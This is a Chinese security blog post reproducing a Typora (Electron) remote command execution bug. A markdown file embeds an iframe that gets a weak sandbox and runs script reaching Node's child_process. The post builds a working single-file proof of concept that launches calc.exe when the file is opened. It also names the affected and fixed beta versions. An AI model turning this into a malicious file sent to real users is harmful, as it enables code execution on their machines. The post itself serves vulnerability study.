---
title: "Typora Remote Command Execution"
date: 2018-12-20T08:30:03+08:00
categories: ['漏洞复现']
tags: ['remote','command','typora']
---

Typora是一个颜值和实力并存的markdown编辑器，我也在用。Typora基于Electron框架进行开发，今天看到了就复现下这个漏洞。

<!--more-->

## 漏洞分析

在基于Electron框架开发的应用中，如果说找到了XSS漏洞，那么基本上也完成了命令执行。那么我们进行XSS盲打之后并没有收获，原因是因为Typora的作者在开发的过程中用到了https://github.com/cure53/DOMPurify ，缓解了大部分的XSS攻击。



然鹅，`iframe`是一个神奇的标签，我们先来尝试下

```html
<iframe src="javascript:alert(1)"></iframe>
```

![插入iframe标签](https://y4er.com/img/uploads/20190509160667.jpg "插入iframe标签")

我们来看下输出的结果

![iframe输入结果](https://y4er.com/img/uploads/20190509163807.jpg)

可以看到，typora把iframe这个标签的src属性会当作相对路径进行处理，那么我们来包含下本地文件试试

新建poc.md输入

```html
<iframe src="./poc.html"></iframe>
```

同目录下的poc.html内容如下：

```javascript
<script>
        window.parent.top.alert(1)
</script>
```

弹窗！

![弹窗](https://y4er.com/img/uploads/20190509166973.jpg)

那么为什么弹窗呢？打开Devtools看下

Typora将我们的iframe标签解析成如下代码，其中`sendbox`是我们要注意的

```html
<iframe src="C:\Users\Y4er\Desktop\poc.html" allow-top-navigation="false" allow-forms="false" allowfullscreen="true" allow-popups="false" sandbox="allow-same-origin allow-scripts" onload="window.remoteOnLoad(this)" height="0" data-user-height="0"></iframe>
```

我们看下[HTML的文档](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox)中关于sendbox的说明，在html5中通过sendbox来提高iframe的安全性，而文档中也提到了

![sendbox说明](https://y4er.com/img/uploads/20190509162505.jpg)

如果`allow-scripts`和`allow-same-origin`同时被设置为sendbox的属性时，那么sendbox则形同虚设

那么我们修改下我们的poc来进行命令执行

```html
<script>
      //rce
        window.parent.top.require('child_process').execFile('C:/Windows/System32/calc.exe',function(error, stdout, stderr){
        if(error){
            console.log(error);
        }  
        });
</script>
```

![弹出计算器](https://y4er.com/img/uploads/20190509168440.jpg)

我们捋一下思路，现在我们通过iframe的src属性引用同目录的poc.html文档，来执行命令。可是这就需要两个文件，一个poc.md，一个poc.html。繁琐，有没有办法做到一个文件就达到我们的命令执行的目的的？

**尝试srcdoc**

```html
<iframe srcdoc="<script>window.parent.top.alert(1)</script>"></iframe>
```

并没有效果，在Devtools中我们看到sendbox的属性被设置为空，那么这是默认应用所有的沙盒限制，srcdoc不可行

**尝试引入md文件**

poc.md

```markdown
<iframe src="./poc.md"></iframe>
```

cmd.md

```html
<script>
      //rce
        window.parent.top.require('child_process').execFile('C:/Windows/System32/calc.exe',function(error, stdout, stderr){
        if(error){
            console.log(error);
        }  
        });
</script>
```

计算器被弹了出来

![熟悉的计算器](https://y4er.com/img/uploads/20190509161330.jpg)

也就是说我们现在能够引入md文件，这样的话我们代码执行的命令就可以直接放到poc.md中，然后自己iframe自己就可以达到命令执行的效果了。

**引用自己**

构造poc.md

```html
<iframe src="./poc.md"></iframe>
<script>
      //rce
        window.parent.top.require('child_process').execFile('C:/Windows/System32/calc.exe',function(error, stdout, stderr){
        if(error){
            console.log(error);
        }  
        });
</script>
```

![弹弹弹](https://y4er.com/img/uploads/20190509165864.jpg)

现在我们把poc.md文件发给别人，只要他用typora打开，就会执行我们代码中的命令。

## 后记

这篇文章是我昨天晚上看到的，今天复现的时候发现点问题，列举下：

1. 平台限制 基于Electron框架开发只是在win上，mac和Linux就另当别论
2. 版本限制 我用0.9.60beta版本不能执行，看了Typora的[版本日志](https://typora.io/windows/dev_release.html)后发现在0.9.9.56 (beta)版本中才支持`video`, `iframe`, `kbd`, `details`, `ruby`这类标签，漏洞也产生在这个版本，而在0.9.9.57 (beta)版本中就对此漏洞进行了修复，限制太大

参考原文链接：https://zhuanlan.zhihu.com/p/51768716